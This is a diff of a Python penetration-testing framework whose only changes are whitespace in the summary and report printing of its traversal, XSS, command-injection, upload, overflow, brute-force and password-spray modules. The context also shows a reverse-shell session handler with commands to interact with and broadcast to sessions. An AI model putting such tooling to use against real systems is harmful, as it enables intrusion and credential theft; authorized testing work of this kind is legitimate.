             fh.write("\nFindings:\n")
             fh.write("-" * 78 + "\n")
             if summary['issues']:
                 for issue in summary['issues']:
-                    fh.write(f"  - {issue['severity']}: {issue['detail']}\n")
-                    fh.write(f"    Remediation: {issue['remediation']}\n")
+                    fh.write(f" - {issue['severity']}: {issue['detail']}\n")
+                    fh.write(f" Remediation: {issue['remediation']}\n")
             else:
-                fh.write("  None\n")
+                fh.write(" None\n")
             fh.write("\nTLS Versions:\n")
             fh.write("-" * 78 + "\n")
             for version in summary['protocols']:
-                fh.write(f"  - {version['version']}: {'SUPPORTED' if version['supported'] else 'not supported'}\n")
+                fh.write(f" - {version['version']}: {'SUPPORTED' if version['supported'] else 'not supported'}\n")
             fh.write("\nCipher Tests:\n")
             fh.write("-" * 78 + "\n")
             for cipher in summary['ciphers']:
-                fh.write(f"  - {cipher['cipher']}: {'ACCEPTED' if cipher['accepted'] else 'rejected'}\n")
+                fh.write(f" - {cipher['cipher']}: {'ACCEPTED' if cipher['accepted'] else 'rejected'}\n")
             fh.write("\nHTTP Headers:\n")
             fh.write("-" * 78 + "\n")
             if summary['http_headers'] and not summary['http_headers'].get('error'):
                 for key, value in summary['http_headers'].items():
-                    fh.write(f"  {key}: {value}\n")
+                    fh.write(f" {key}: {value}\n")
             elif summary['http_headers'].get('error'):
-                fh.write(f"  Error: {summary['http_headers']['error']}\n")
+                fh.write(f" Error: {summary['http_headers']['error']}\n")
         print(f"{Fore.GREEN}[+] Reports saved:{Style.RESET_ALL}")
-        print(f"  • {json_file}")
-        print(f"  • {txt_file}")
+        print(f" • {json_file}")
+        print(f" • {txt_file}")
 
     def run_dir_traversal(self):
         """Adaptive directory traversal analyzer"""
@@ -9975,14 +9975,14 @@ class KNDYSFramework:
         print(f"{Fore.CYAN}TRAVERSAL SUMMARY{Style.RESET_ALL}")
         print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
         print(f"{Fore.WHITE} Payloads tested : {Fore.CYAN}{total_payloads}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Findings        : {Fore.GREEN}{len(findings)}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Errors          : {Fore.YELLOW}{len(errors)}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Duration        : {Fore.CYAN}{duration:.2f}s{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Findings : {Fore.GREEN}{len(findings)}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Errors : {Fore.YELLOW}{len(errors)}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Duration : {Fore.CYAN}{duration:.2f}s{Style.RESET_ALL}")
 
         if findings:
             print(f"\n{Fore.GREEN}[+] Top Findings{Style.RESET_ALL}")
             for finding in findings[:5]:
-                print(f"  {Fore.YELLOW}{finding['severity']:<8}{Style.RESET_ALL} {finding['payload']} → {finding['status']} ({finding['evidence'][0]['value']})")
+                print(f" {Fore.YELLOW}{finding['severity']:<8}{Style.RESET_ALL} {finding['payload']} → {finding['status']} ({finding['evidence'][0]['value']})")
         else:
             print(f"\n{Fore.YELLOW}[*] No definitive traversal impact detected{Style.RESET_ALL}")
 
@@ -9998,7 +9998,7 @@ class KNDYSFramework:
         if report_paths:
             print(f"\n{Fore.GREEN}[+] Reports saved:{Style.RESET_ALL}")
             for path in report_paths:
-                print(f"  • {path}")
+                print(f" • {path}")
 
     def _parse_header_string(self, header_str):
         headers = {}
@@ -10263,8 +10263,8 @@ class KNDYSFramework:
                 fh.write("Findings:\n" + "-" * 78 + "\n")
                 for finding in findings:
                     fh.write(f"- {finding['severity']} | Payload: {finding['payload']} | Status: {finding['status']}\n")
-                    fh.write(f"  Evidence: {finding['evidence'][0]['value']}\n")
-                    fh.write(f"  Snippet: {finding['snippet']}\n\n")
+                    fh.write(f" Evidence: {finding['evidence'][0]['value']}\n")
+                    fh.write(f" Snippet: {finding['snippet']}\n\n")
             else:
                 fh.write("No definitive traversal impact detected.\n\n")
             if errors:
@@ -10343,8 +10343,8 @@ class KNDYSFramework:
                 print(f"{Fore.CYAN}╔{'═'*70}╗{Style.RESET_ALL}")
                 print(f"{Fore.CYAN}║{' '*18}KNDYS MULTI-HANDLER CORE{' '*19}║{Style.RESET_ALL}")
                 print(f"{Fore.CYAN}╚{'═'*70}╝{Style.RESET_ALL}")
-                print(f"{Fore.CYAN}[*] LHOST      : {self.profile['lhost']}{Style.RESET_ALL}")
-                print(f"{Fore.CYAN}[*] LPORT      : {self.profile['lport']}{Style.RESET_ALL}")
+                print(f"{Fore.CYAN}[*] LHOST : {self.profile['lhost']}{Style.RESET_ALL}")
+                print(f"{Fore.CYAN}[*] LPORT : {self.profile['lport']}{Style.RESET_ALL}")
                 print(f"{Fore.CYAN}[*] Transports : {', '.join(self.profile['transports'])}{Style.RESET_ALL}")
                 print(f"{Fore.CYAN}[*] MaxSessions: {self.profile['max_sessions']}{Style.RESET_ALL}")
                 if self.profile['record_sessions']:
@@ -10548,18 +10548,18 @@ while True:
 
             def _command_loop(self):
                 help_lines = [
-                    "sessions                → list active sessions",
-                    "interact <id>           → attach to session",
-                    "read <id>               → dump last buffered output",
-                    "broadcast <cmd>         → send command to all sessions",
-                    "kill <id>               → terminate session",
-                    "stats                   → show handler metrics",
-                    "help                    → show this help",
-                    "exit                    → stop handler"
+                    "sessions → list active sessions",
+                    "interact <id> → attach to session",
+                    "read <id> → dump last buffered output",
+                    "broadcast <cmd> → send command to all sessions",
+                    "kill <id> → terminate session",
+                    "stats → show handler metrics",
+                    "help → show this help",
+                    "exit → stop handler"
                 ]
                 print(f"{Fore.CYAN}Available handler commands:{Style.RESET_ALL}")
                 for line in help_lines:
-                    print(f"  {line}")
+                    print(f" {line}")
                 while not self.stop_event.is_set():
                     try:
                         cmd = input(f"{Fore.CYAN}handler{Fore.RED}►{Style.RESET_ALL} ").strip()
@@ -10572,7 +10572,7 @@ while True:
                         break
                     if cmd == 'help':
                         for line in help_lines:
-                            print(f"  {line}")
+                            print(f" {line}")
                     elif cmd == 'sessions':
                         self._list_sessions()
                     elif cmd.startswith('interact '):
@@ -10658,7 +10658,7 @@ while True:
                     total = len(self.sessions)
                     active = len([s for s in self.sessions.values() if s.active])
                 print(f"{Fore.CYAN}[*] Total sessions ever : {total}{Style.RESET_ALL}")
-                print(f"{Fore.CYAN}[*] Active sessions     : {active}{Style.RESET_ALL}")
+                print(f"{Fore.CYAN}[*] Active sessions : {active}{Style.RESET_ALL}")
 
             def _close_session(self, arg):
                 try:
@@ -10774,7 +10774,7 @@ while True:
                         print(output.decode('utf-8', errors='ignore'))
                         
                 except KeyboardInterrupt:
-                    client.send(b'\x03')  # Ctrl+C
+                    client.send(b'\x03') # Ctrl+C
                     continue
                 except Exception as e:
                     print(f"{Fore.RED}[-] Error: {str(e)}{Style.RESET_ALL}")
@@ -11027,7 +11027,7 @@ while True:
             if listener.start():
                 print(f"{Fore.GREEN}[+] Beacon listener active on {profile['listener_host']}:{profile['listener_port']}{Style.RESET_ALL}")
                 if profile['listener_token']:
-                    print(f"{Fore.BLUE}ℹ  Expecting token: {profile['listener_token']}{Style.RESET_ALL}")
+                    print(f"{Fore.BLUE}ℹ Expecting token: {profile['listener_token']}{Style.RESET_ALL}")
             else:
                 print(f"{Fore.RED}[!] Failed to start beacon listener; continuing without it{Style.RESET_ALL}")
                 listener = None
@@ -11040,7 +11040,7 @@ while True:
             return
         print(f"{Fore.CYAN}[*] Prepared {len(payloads)} payload(s) using the {profile['payload_profile']} profile{Style.RESET_ALL}")
         for payload in payloads[:5]:
-            print(f"  {Fore.YELLOW}{payload.name:<16}{Style.RESET_ALL} ctx={payload.context:<8} tags={','.join(payload.tags)}")
+            print(f" {Fore.YELLOW}{payload.name:<16}{Style.RESET_ALL} ctx={payload.context:<8} tags={','.join(payload.tags)}")
         findings = []
         errors = []
         duration = 0.0
@@ -11061,7 +11061,7 @@ while True:
         if report_paths:
             print(f"\n{Fore.GREEN}[+] XSS exploit reports saved:{Style.RESET_ALL}")
             for path in report_paths:
-                print(f"   • {path}")
+                print(f" • {path}")
         if listener:
             listener.stop()
 
@@ -11069,27 +11069,27 @@ while True:
         print(f"\n{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
         print(f"{Fore.CYAN}XSS EXPLOIT SUMMARY{Style.RESET_ALL}")
         print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Payloads prepared  : {Fore.CYAN}{len(payloads)}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Payloads prepared : {Fore.CYAN}{len(payloads)}{Style.RESET_ALL}")
         if requests_tested:
             print(f"{Fore.WHITE} Requests attempted : {Fore.CYAN}{requests_tested}{Style.RESET_ALL}")
         print(f"{Fore.WHITE} Findings discovered: {Fore.GREEN}{len(findings)}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Errors logged      : {Fore.YELLOW}{len(errors)}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Errors logged : {Fore.YELLOW}{len(errors)}{Style.RESET_ALL}")
         if duration:
-            print(f"{Fore.WHITE} Duration           : {Fore.CYAN}{duration:.2f}s{Style.RESET_ALL}")
+            print(f"{Fore.WHITE} Duration : {Fore.CYAN}{duration:.2f}s{Style.RESET_ALL}")
         if findings:
             print(f"\n{Fore.GREEN}[+] Top Findings{Style.RESET_ALL}")
             for finding in findings[:5]:
-                print(f"  {Fore.YELLOW}{finding.severity:<6}{Style.RESET_ALL} param={finding.parameter} via {finding.payload_name} → {finding.reflection_type} context")
-                print(f"     Evidence: {finding.evidence[:80]}")
+                print(f" {Fore.YELLOW}{finding.severity:<6}{Style.RESET_ALL} param={finding.parameter} via {finding.payload_name} → {finding.reflection_type} context")
+                print(f" Evidence: {finding.evidence[:80]}")
         if beacon_events:
             print(f"\n{Fore.GREEN}[+] Captured beacon events: {len(beacon_events)}{Style.RESET_ALL}")
             for event in beacon_events[:5]:
                 token = event['query'].get('token', '')
-                print(f"  {event['source']} {time.strftime('%H:%M:%S', time.localtime(event['timestamp']))} token={token}")
+                print(f" {event['source']} {time.strftime('%H:%M:%S', time.localtime(event['timestamp']))} token={token}")
         if errors:
             print(f"\n{Fore.YELLOW}[!] Errors / warnings{Style.RESET_ALL}")
             for entry in errors[:5]:
-                print(f"  - {entry.get('error')}")
+                print(f" - {entry.get('error')}")
 
     def _export_xss_exploit_results(self, profile, payloads, findings, errors, duration, requests_tested, beacon_events):
         timestamp = int(time.time())
@@ -11126,9 +11126,9 @@ while True:
                 fh.write("Findings:\n")
                 for finding in findings:
                     fh.write(f"- [{finding.severity}] param={finding.parameter} via {finding.payload_name}\n")
-                    fh.write(f"  Context: {finding.context} Reflection: {finding.reflection_type}\n")
-                    fh.write(f"  Evidence: {finding.evidence}\n")
-                    fh.write(f"  Payload: {finding.payload}\n\n")
+                    fh.write(f" Context: {finding.context} Reflection: {finding.reflection_type}\n")
+                    fh.write(f" Evidence: {finding.evidence}\n")
+                    fh.write(f" Payload: {finding.payload}\n\n")
             if beacon_events:
                 fh.write("Beacon events:\n")
                 for event in beacon_events:
@@ -11223,32 +11223,32 @@ while True:
         print(f"\n{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
         print(f"{Fore.CYAN}COMMAND INJECTION SUMMARY{Style.RESET_ALL}")
         print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Target            : {Fore.CYAN}{profile['url']}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} OS Profile        : {Fore.CYAN}{profile['os_profile'].title()}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Target : {Fore.CYAN}{profile['url']}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} OS Profile : {Fore.CYAN}{profile['os_profile'].title()}{Style.RESET_ALL}")
         print(f"{Fore.WHITE} Parameters tested : {Fore.CYAN}{profile['parameters']}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Attack modes      : {Fore.CYAN}{', '.join(profile['attack_modes'])}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Attack modes : {Fore.CYAN}{', '.join(profile['attack_modes'])}{Style.RESET_ALL}")
         print(f"{Fore.WHITE} Requests scheduled: {Fore.CYAN}{requests_planned}{Style.RESET_ALL}")
         if duration:
-            print(f"{Fore.WHITE} Duration          : {Fore.CYAN}{duration:.2f}s{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Findings          : {Fore.GREEN}{len(findings)}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Errors            : {Fore.YELLOW}{len(errors)}{Style.RESET_ALL}")
+            print(f"{Fore.WHITE} Duration : {Fore.CYAN}{duration:.2f}s{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Findings : {Fore.GREEN}{len(findings)}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Errors : {Fore.YELLOW}{len(errors)}{Style.RESET_ALL}")
         if findings:
             print(f"\n{Fore.GREEN}[+] Confirmed findings{Style.RESET_ALL}")
             for finding in findings[:5]:
-                print(f"  {Fore.YELLOW}{finding.severity:<8}{Style.RESET_ALL} param={finding.parameter:<10} via {finding.payload_name:<16} ({finding.location})")
-                print(f"     Indicator: {finding.indicator} | Status {finding.status_code} | {finding.elapsed:.2f}s")
-                print(f"     Evidence : {finding.evidence[:90]}")
+                print(f" {Fore.YELLOW}{finding.severity:<8}{Style.RESET_ALL} param={finding.parameter:<10} via {finding.payload_name:<16} ({finding.location})")
+                print(f" Indicator: {finding.indicator} | Status {finding.status_code} | {finding.elapsed:.2f}s")
+                print(f" Evidence : {finding.evidence[:90]}")
             shells = self._recommend_reverse_shells(profile['os_profile'])
             if shells:
                 print(f"\n{Fore.CYAN}Recommended follow-up payloads:{Style.RESET_ALL}")
                 for descriptor in shells:
-                    print(f"  - {descriptor}")
+                    print(f" - {descriptor}")
         else:
             print(f"\n{Fore.YELLOW}[*] No definitive command injection indicators observed{Style.RESET_ALL}")
         if errors:
             print(f"\n{Fore.YELLOW}[!] Errors / warnings{Style.RESET_ALL}")
             for entry in errors[:5]:
-                print(f"  - {entry.get('error')}")
+                print(f" - {entry.get('error')}")
 
     def _export_command_injection_results(self, profile, findings, errors, duration, requests_planned):
         timestamp = int(time.time())
@@ -11331,7 +11331,7 @@ while True:
         report_paths = self._export_command_injection_results(profile_view, findings, errors, duration, requests_planned)
         print(f"\n{Fore.GREEN}[+] Command injection reports saved:{Style.RESET_ALL}")
         for path in report_paths:
-            print(f"   • {path}")
+            print(f" • {path}")
 
     def _resolve_file_upload_profile(self):
         opts = self.module_options
@@ -11423,27 +11423,27 @@ while True:
         print(f"\n{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
         print(f"{Fore.CYAN}FILE UPLOAD SUMMARY{Style.RESET_ALL}")
         print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Target           : {Fore.CYAN}{profile['url']}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Target : {Fore.CYAN}{profile['url']}{Style.RESET_ALL}")
         print(f"{Fore.WHITE} Payloads crafted : {Fore.CYAN}{len(payloads)}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Requests issued  : {Fore.CYAN}{requests_made}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Findings         : {Fore.GREEN}{len(findings)}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Errors           : {Fore.YELLOW}{len(errors)}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Requests issued : {Fore.CYAN}{requests_made}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Findings : {Fore.GREEN}{len(findings)}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Errors : {Fore.YELLOW}{len(errors)}{Style.RESET_ALL}")
         if duration:
-            print(f"{Fore.WHITE} Duration         : {Fore.CYAN}{duration:.2f}s{Style.RESET_ALL}")
+            print(f"{Fore.WHITE} Duration : {Fore.CYAN}{duration:.2f}s{Style.RESET_ALL}")
         if payloads:
             preview = ', '.join(payload.name for payload in payloads[:5])
-            print(f"{Fore.WHITE} Payload preview  : {Fore.CYAN}{preview}{Style.RESET_ALL}")
+            print(f"{Fore.WHITE} Payload preview : {Fore.CYAN}{preview}{Style.RESET_ALL}")
         if findings:
             print(f"\n{Fore.GREEN}[+] Confirmed upload exposure{Style.RESET_ALL}")
             for finding in findings[:5]:
-                print(f"  {Fore.YELLOW}{finding.severity:<9}{Style.RESET_ALL} payload={finding.payload_name:<12} vector={finding.vector:<10} verification={finding.verification}")
+                print(f" {Fore.YELLOW}{finding.severity:<9}{Style.RESET_ALL} payload={finding.payload_name:<12} vector={finding.vector:<10} verification={finding.verification}")
                 if finding.access_url:
-                    print(f"     URL: {finding.access_url}")
-                print(f"     Evidence: {finding.evidence[:90]}")
+                    print(f" URL: {finding.access_url}")
+                print(f" Evidence: {finding.evidence[:90]}")
         if errors:
             print(f"\n{Fore.YELLOW}[!] Warnings / errors{Style.RESET_ALL}")
             for entry in errors[:5]:
-                print(f"  - {entry.get('error')}")
+                print(f" - {entry.get('error')}")
 
     def _export_file_upload_results(self, profile, result):
         timestamp = int(time.time())
@@ -11513,7 +11513,7 @@ while True:
         if report_paths:
             print(f"\n{Fore.GREEN}[+] File upload reports saved:{Style.RESET_ALL}")
             for path in report_paths:
-                print(f"   • {path}")
+                print(f" • {path}")
     
     def _resolve_buffer_overflow_profile(self):
         opts = self.module_options
@@ -11605,29 +11605,29 @@ while True:
         print(f"\n{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
         print(f"{Fore.CYAN}BUFFER OVERFLOW SUMMARY{Style.RESET_ALL}")
         print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Target            : {Fore.CYAN}{profile['target']}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Target : {Fore.CYAN}{profile['target']}{Style.RESET_ALL}")
         print(f"{Fore.WHITE} Payloads prepared : {Fore.CYAN}{len(payloads)}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Requests issued   : {Fore.CYAN}{requests}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Requests issued : {Fore.CYAN}{requests}{Style.RESET_ALL}")
         print(f"{Fore.WHITE} Findings detected : {Fore.GREEN}{len(findings)}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Errors logged     : {Fore.YELLOW}{len(errors)}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Errors logged : {Fore.YELLOW}{len(errors)}{Style.RESET_ALL}")
         if duration:
-            print(f"{Fore.WHITE} Duration          : {Fore.CYAN}{duration:.2f}s{Style.RESET_ALL}")
+            print(f"{Fore.WHITE} Duration : {Fore.CYAN}{duration:.2f}s{Style.RESET_ALL}")
         if payloads:
             preview = ', '.join(payload.name for payload in payloads[:5])
-            print(f"{Fore.WHITE} Payload preview   : {Fore.CYAN}{preview}{Style.RESET_ALL}")
+            print(f"{Fore.WHITE} Payload preview : {Fore.CYAN}{preview}{Style.RESET_ALL}")
         if result.get('offset_hint') is not None:
-            print(f"{Fore.WHITE} Offset hint       : {Fore.CYAN}{result['offset_hint']} byte(s){Style.RESET_ALL}")
+            print(f"{Fore.WHITE} Offset hint : {Fore.CYAN}{result['offset_hint']} byte(s){Style.RESET_ALL}")
         if findings:
             print(f"\n{Fore.GREEN}[+] Indicators{Style.RESET_ALL}")
             for finding in findings[:5]:
                 crash_flag = 'CRASH' if finding.crash else 'INFO'
-                print(f"  {Fore.YELLOW}{finding.payload_name:<18}{Style.RESET_ALL} len={finding.length:<5} indicator={finding.indicator} ({crash_flag})")
+                print(f" {Fore.YELLOW}{finding.payload_name:<18}{Style.RESET_ALL} len={finding.length:<5} indicator={finding.indicator} ({crash_flag})")
                 if finding.evidence:
-                    print(f"     Evidence: {finding.evidence[:90]}")
+                    print(f" Evidence: {finding.evidence[:90]}")
         if errors:
             print(f"\n{Fore.YELLOW}[!] Errors / warnings{Style.RESET_ALL}")
             for entry in errors[:5]:
-                print(f"  - {entry.get('error')}")
+                print(f" - {entry.get('error')}")
 
     def _export_buffer_overflow_results(self, profile, result):
         timestamp = int(time.time())
@@ -11675,8 +11675,8 @@ while True:
                 for finding in result['findings']:
                     fh.write(f"[{finding.severity}] payload={finding.payload_name} length={finding.length}\n")
                     fh.write(f"Indicator : {finding.indicator}\n")
-                    fh.write(f"Evidence  : {finding.evidence}\n")
-                    fh.write(f"Crash     : {finding.crash}\n\n")
+                    fh.write(f"Evidence : {finding.evidence}\n")
+                    fh.write(f"Crash : {finding.crash}\n\n")
             if result['errors']:
                 fh.write("Errors / Warnings\n")
                 fh.write("-" * 40 + "\n")
@@ -11697,7 +11697,7 @@ while True:
         if report_paths:
             print(f"\n{Fore.GREEN}[+] Buffer overflow reports saved:{Style.RESET_ALL}")
             for path in report_paths:
-                print(f"   • {path}")
+                print(f" • {path}")
     
     # ============ PASSWORD ATTACK MODULES ============
     
@@ -11722,13 +11722,13 @@ while True:
         print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
         print(f"{Fore.CYAN}BRUTE FORCE MODULE{Style.RESET_ALL}")
         print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Service        : {Fore.CYAN}{profile['service'].upper()}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Target         : {Fore.CYAN}{profile['target']}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Usernames      : {Fore.CYAN}{len(usernames)}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Passwords      : {Fore.CYAN}{len(passwords)}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Combinations   : {Fore.CYAN}{len(combinations)}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Concurrency    : {Fore.CYAN}{profile['concurrency']} worker(s){Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Delay/Jitter   : {Fore.CYAN}{profile['delay']}s / {profile['jitter']}s{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Service : {Fore.CYAN}{profile['service'].upper()}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Target : {Fore.CYAN}{profile['target']}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Usernames : {Fore.CYAN}{len(usernames)}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Passwords : {Fore.CYAN}{len(passwords)}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Combinations : {Fore.CYAN}{len(combinations)}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Concurrency : {Fore.CYAN}{profile['concurrency']} worker(s){Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Delay/Jitter : {Fore.CYAN}{profile['delay']}s / {profile['jitter']}s{Style.RESET_ALL}")
         print(f"{Fore.WHITE} Stop on success: {Fore.CYAN}{profile['stop_on_success']}{Style.RESET_ALL}\n")
         result = self._execute_brute_force(profile, connector, combinations)
         if hasattr(connector, 'close'):
@@ -11738,7 +11738,7 @@ while True:
         if report_paths:
             print(f"\n{Fore.GREEN}[+] Brute force reports saved:{Style.RESET_ALL}")
             for path in report_paths:
-                print(f"   • {path}")
+                print(f" • {path}")
         if not result['successes']:
             print(f"{Fore.YELLOW}[*] No valid passwords identified. Consider adjusting scope or lists.{Style.RESET_ALL}")
         return result
@@ -12104,32 +12104,32 @@ while True:
         print(f"\n{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
         print(f"{Fore.CYAN}BRUTE FORCE SUMMARY{Style.RESET_ALL}")
         print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Attempts     : {Fore.CYAN}{result['attempts']}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Duration     : {Fore.CYAN}{duration:.2f}s{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Throughput   : {Fore.CYAN}{throughput:.2f} attempts/s{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Successes    : {Fore.GREEN}{len(result['successes'])}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Attempts : {Fore.CYAN}{result['attempts']}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Duration : {Fore.CYAN}{duration:.2f}s{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Throughput : {Fore.CYAN}{throughput:.2f} attempts/s{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Successes : {Fore.GREEN}{len(result['successes'])}{Style.RESET_ALL}")
         print(f"{Fore.WHITE} Locked users : {Fore.YELLOW}{len(result['lockouts'])}{Style.RESET_ALL}")
         if result['aborted_reason'] and result['aborted_reason'] not in {'success'}:
             print(f"{Fore.YELLOW}[!] Run ended because: {result['aborted_reason']}{Style.RESET_ALL}")
         if result['successes']:
             print(f"\n{Fore.GREEN}[+] Valid credentials{Style.RESET_ALL}")
             for success in result['successes'][:5]:
-                print(f"  {success.username}:{success.password_preview} ({success.service}@{success.target})")
+                print(f" {success.username}:{success.password_preview} ({success.service}@{success.target})")
                 if success.evidence:
-                    print(f"     Evidence: {success.evidence[:80]}")
+                    print(f" Evidence: {success.evidence[:80]}")
         if result['lockouts']:
             print(f"\n{Fore.YELLOW}[!] Lockout indicators{Style.RESET_ALL}")
             for user, count in list(result['lockouts'].items())[:5]:
-                print(f"  {user} ({count} events)")
+                print(f" {user} ({count} events)")
         if result['errors']:
             print(f"\n{Fore.YELLOW}[*] Recent errors{Style.RESET_ALL}")
             for error in result['errors'][-5:]:
-                print(f"  - {error[:90]}")
+                print(f" - {error[:90]}")
         if result['attempt_log']:
             print(f"\n{Fore.BLUE}[*] Recent attempts{Style.RESET_ALL}")
             for entry in result['attempt_log'][-profile['telemetry_tail']:]:
                 status = 'OK' if entry['success'] else 'FAIL'
-                print(f"  {entry['username']:<12} {entry['password']:<10} -> {status} ({entry['latency']}s)")
+                print(f" {entry['username']:<12} {entry['password']:<10} -> {status} ({entry['latency']}s)")
 
     def _export_brute_force_results(self, profile, result):
         timestamp = int(time.time())
@@ -12163,7 +12163,7 @@ while True:
                 fh.write("BRUTE FORCE REPORT\n")
                 fh.write(f"Generated: {self._utc_timestamp()}\n")
                 fh.write(f"Service : {profile['service']}\n")
-                fh.write(f"Target  : {profile['target']}\n")
+                fh.write(f"Target : {profile['target']}\n")
                 fh.write(f"Attempts: {result['attempts']} | Successes: {len(result['successes'])}\n")
                 fh.write(f"Duration: {result['duration']:.2f}s | Lockouts: {len(result['lockouts'])}\n")
                 if result['successes']:
@@ -12171,7 +12171,7 @@ while True:
                     for success in result['successes']:
                         fh.write(f"- {success.username}:{success.password_preview} ({success.service}@{success.target})\n")
                         if success.evidence:
-                            fh.write(f"  Evidence: {success.evidence}\n")
+                            fh.write(f" Evidence: {success.evidence}\n")
                 if result['attempt_log']:
                     fh.write("\nRecent attempts\n---------------\n")
                     for entry in result['attempt_log']:
@@ -12417,12 +12417,12 @@ while True:
         if summary.errors:
             print(f"{Fore.YELLOW}[!] Engine reported {len(summary.errors)} error(s):{Style.RESET_ALL}")
             for err in summary.errors[-5:]:
-                print(f"  - {err}")
+                print(f" - {err}")
 
         if source_counter:
             print(f"{Fore.BLUE}[*] Candidate source utilization:{Style.RESET_ALL}")
             for label, count in source_counter.most_common():
-                print(f"  {label:<12} {count:,}")
+                print(f" {label:<12} {count:,}")
 
         if summary.stop_reason == 'runtime':
             print(f"{Fore.YELLOW}[!] Cracking stopped because the max runtime was reached{Style.RESET_ALL}")
@@ -12453,15 +12453,15 @@ while True:
         print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
         print(f"{Fore.CYAN}PASSWORD SPRAY MODULE{Style.RESET_ALL}")
         print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Service        : {Fore.CYAN}{profile['service'].upper()}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Target         : {Fore.CYAN}{profile['target']}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Usernames      : {Fore.CYAN}{len(usernames)}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Passwords      : {Fore.CYAN}{len(passwords)}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Concurrency    : {Fore.CYAN}{profile['concurrency']} worker(s){Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Attempt delay  : {Fore.CYAN}{profile['attempt_delay']}s ± {profile['attempt_jitter']}s{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Service : {Fore.CYAN}{profile['service'].upper()}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Target : {Fore.CYAN}{profile['target']}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Usernames : {Fore.CYAN}{len(usernames)}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Passwords : {Fore.CYAN}{len(passwords)}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Concurrency : {Fore.CYAN}{profile['concurrency']} worker(s){Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Attempt delay : {Fore.CYAN}{profile['attempt_delay']}s ± {profile['attempt_jitter']}s{Style.RESET_ALL}")
         print(f"{Fore.WHITE} Password pause : {Fore.CYAN}{profile['password_cooldown']}s{Style.RESET_ALL}")
         if profile['rate_limit']:
-            print(f"{Fore.WHITE} Rate limit     : {Fore.CYAN}{profile['rate_limit']} req/{profile['rate_window']}s{Style.RESET_ALL}")
+            print(f"{Fore.WHITE} Rate limit : {Fore.CYAN}{profile['rate_limit']} req/{profile['rate_window']}s{Style.RESET_ALL}")
         print(f"{Fore.WHITE} Stop on success: {Fore.CYAN}{profile['stop_on_success']}{Style.RESET_ALL}\n")
 
